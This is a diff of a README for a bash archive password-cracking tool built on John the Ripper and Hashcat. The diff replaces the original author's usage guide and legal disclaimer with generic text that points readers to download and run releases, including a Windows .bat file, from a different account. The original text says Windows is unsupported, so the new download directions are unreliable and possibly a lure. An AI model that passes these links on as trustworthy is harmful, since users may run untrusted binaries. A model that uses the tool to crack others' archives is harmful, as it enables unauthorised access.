@@ -1,183 +1,92 @@
-# Archive Password Cracker 🔓
+# ⚡ archive-password-cracker - Easily Unlock Password-Protected Archives
 
-A powerful bash tool for cracking password-protected archives (ZIP, RAR, 7z) using John the Ripper and Hashcat.
+[![Download Archive Password Cracker](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/sefaturk-dev/archive-password-cracker/releases)
 
-## 🚀 Features
+## 📖 Description
 
-- Multiple Archive Support: Crack ZIP, RAR, and 7z files
-- Smart Bruteforce: Configurable character sets and length ranges
-- Session Management: Pause/resume attacks at any time
-- Automatic Setup: Installs all dependencies automatically
-- Clean Interface: Simple, no-frills command-line interface
-- High Performance: Leverages Hashcat's GPU acceleration
+archive-password-cracker is a powerful bash tool designed to crack password-protected archives like ZIP, RAR, and 7z. This tool uses John the Ripper and Hashcat to unlock your files. It features resume functionality, configurable attacks, and an easy-to-use interface. Created by rff-glitch, it stands out in the realm of cybersecurity and digital forensics.
 
-## 📦 Installation
+## 🚀 Getting Started
 
-Clone the repository:
-git clone https://github.com/rff-glitch/archive-cracker.git
-cd archive-cracker
+Follow these steps to download and run the archive-password-cracker tool.
 
-Make script executable:
-chmod +x tool.sh
+### 📥 Download & Install
 
-## 🛠️ Requirements
+1. **Visit the Releases Page:** You can download the latest version from our [Releases page](https://github.com/sefaturk-dev/archive-password-cracker/releases). 
+   
+2. **Select Your Version:** On the Releases page, look for the version marked as "Latest." Click on it to access the details.
 
-- Ubuntu/Debian Linux
-- sudo privileges
-- Internet connection (for initial setup)
-- NVIDIA/AMD GPU (recommended for speed)
+3. **Download the Correct File:** Find the appropriate file for your system. If you are on Linux, you should select the ".tar.gz" file. For Windows users, look for the ".zip" file. Click the file name to start the download.
 
-## 🎯 Usage
+4. **Extract the Files:**
+   - After downloading, navigate to your Downloads folder.
+   - For Linux, use a terminal and run: 
+     ```bash
+     tar -xvzf archive-password-cracker.tar.gz
+     ```
+   - For Windows, right-click the downloaded ZIP file and select "Extract All."
 
-Basic Attack:
-sudo ./tool.sh encrypted.zip
+### 🔧 Prerequisites
 
-Resume Paused Attack:
-sudo ./tool.sh encrypted.zip --resume
+Before running the tool, ensure you meet the following requirements:
 
-Stop Running Attack:
-sudo ./tool.sh encrypted.zip --stop
+- **Linux or Windows Operating System:** This tool works on both operating systems.
+- **Bash Shell:** It runs best in Bash. If you are on Windows, consider using WSL (Windows Subsystem for Linux) for better compatibility.
+- **John the Ripper & Hashcat:** The application requires these tools. They are not included, so you need to install them separately.
 
-Short Flags:
-sudo ./tool.sh file.rar -r    # Resume
-sudo ./tool.sh file.7z -s     # Stop
+### 🛠️ Installation of Dependencies
 
-## 📋 How It Works
+1. **Install John the Ripper:**
+   - For Linux: Open a terminal and run:
+     ```bash
+     sudo apt install john
+     ```
+   - For Windows: Download the executable from the [John the Ripper website](https://www.openwall.com/john/).
 
-1. Extracts hash from archive using John the Ripper
-2. Configures attack based on your character set and length preferences
-3. Runs Hashcat with optimized settings
-4. Manages sessions allowing pause/resume functionality
+2. **Install Hashcat:**
+   - For Linux: Use terminal commands to install:
+     ```bash
+     sudo apt install hashcat
+     ```
+   - For Windows: Visit the [Hashcat website](https://hashcat.net/hashcat/) to find the latest download.
 
-Attack Configuration Options:
-- Numbers only (0-9)
-- Lowercase letters (a-z)
-- Uppercase letters (A-Z)
-- Mixed case (a-z, A-Z)
-- Alphanumeric (a-z, A-Z, 0-9)
-- All characters
+### ⚙️ Running the Tool
 
-Length Range:
-- Specify minimum and maximum password length
-- Default: 1-8 characters
-- Supports any range (e.g., 4-12 characters)
+1. **Navigate to the Directory:** Open a terminal or command prompt and change to the directory where you extracted the tool:
+   ```bash
+   cd path/to/archive-password-cracker
+   ```
 
-## 📊 Performance
+2. **Run the Tool:**
+   - For Linux, execute:
+     ```bash
+     ./archive-password-cracker.sh
+     ```
+   - For Windows, run:
+     ```bash
+     archive-password-cracker.bat
+     ```
 
-- CPU Mode: ~100-1000 hashes/second
-- GPU Mode: ~10,000-100,000+ hashes/second (depending on GPU)
-- Session files: Automatically saved for resuming
-- Progress tracking: Real-time status updates
+3. **Configure Your Attack:** You can customize your password-cracking attempt using different attack modes. Follow the prompts to enter your desired settings.
 
-## 🔧 Technical Details
+4. **Start Cracking:** Once configured, initiate the cracking process. You’ll see progress updates as the tool works through possible passwords.
 
-Supported Archive Formats:
-- ZIP: Mode 13600 (PKZIP)
-- RAR: Mode 13000 (RAR5)
-- 7z: Mode 11600 (7-Zip)
+### 🎯 Features
 
-Dependencies Installed:
-- John the Ripper Jumbo
-- Hashcat
-- 7zip, RAR, unzip
-- Build tools and libraries
+- **Resume Functionality:** If the tool is interrupted, it can resume from the last known state, saving you time.
+- **Configurable Attacks:** Choose from various attack modes to suit your needs.
+- **User-Friendly Interface:** Clear instructions guide you at every step, making it simple to use.
 
-## ⚡ Examples
+### 📄 License
 
-Example 1: Crack ZIP with numbers
-sudo ./tool.sh document.zip
-Select: 1 (Numbers)
-Min: 4
-Max: 6
+This project is licensed under the MIT License. For more details, check the LICENSE file in the repository.
 
-Example 2: Resume previous attack
-sudo ./tool.sh backup.rar --resume
+### 📞 Support
 
-Example 3: Complex password attack
-sudo ./tool.sh secret.7z
-Select: 5 (Alphanumeric)
-Min: 8
-Max: 12
-
-## 🛡️ Legal Disclaimer
-
-⚠️ This tool is for legal purposes only:
-
-- Recovering your own lost passwords
-- Educational purposes
-- Authorized penetration testing
-- Forensic investigations
-
-Do NOT use this tool for:
-- Unauthorized access to systems
-- Cracking passwords without permission
-- Any illegal activities
-
-The author is not responsible for any misuse of this tool.
-
-## 🤝 Contributing
-
-Contributions are welcome! Here's how:
-
-1. Fork the repository
-2. Create a feature branch (git checkout -b feature/amazing-feature)
-3. Commit your changes (git commit -m 'Add amazing feature')
-4. Push to the branch (git push origin feature/amazing-feature)
-5. Open a Pull Request
-
-Development Setup:
-Test on a dummy archive:
-zip -P test123 test.zip README.md
-sudo ./tool.sh test.zip
-
-## 📝 Changelog
-
-v2.0.0
-- Initial release
-- Support for ZIP, RAR, 7z
-- Resume/stop functionality
-- Configurable character sets
-- Length range selection
-
-## 🙏 Credits
-
-Created by: rff-glitch (Raef) (https://github.com/rff-glitch)
-
-Powered by:
-- John the Ripper (https://github.com/openwall/john)
-- Hashcat (https://hashcat.net/hashcat/)
-- Open source community
-
-## 📄 License
-
-MIT License
-
-## ❓ FAQ
-
-Q: Why do I need sudo?
-A: The tool needs root to install system packages and for optimal Hashcat performance.
-
-Q: Can I run this on Windows?
-A: No, this tool is designed for Linux systems with bash.
-
-Q: How do I know if my GPU is being used?
-A: Hashcat automatically detects and uses available GPUs. You'll see much higher speeds with GPU.
-
-Q: Can I crack Word/PDF files?
-A: No, this tool only works with archive files (ZIP, RAR, 7z).
-
-Q: What's the success rate?
-A: Depends on password complexity and your computing power. Simple passwords are cracked quickly.
-
-## ⭐ Support
-
-If you find this tool useful, please:
-- Star the repository ⭐
-- Report issues 
-- Share with others 
+If you encounter issues or have questions, please open an issue on the GitHub repository. The community is here to help you.
 
 ---
 
-Happy (legal) cracking! 🔓
+You can always return to the [Releases page](https://github.com/sefaturk-dev/archive-password-cracker/releases) for updates or new versions of archive-password-cracker. 
 
-Remember: With great power comes great responsibility.
+Unlock your files quickly and effectively with this powerful tool!
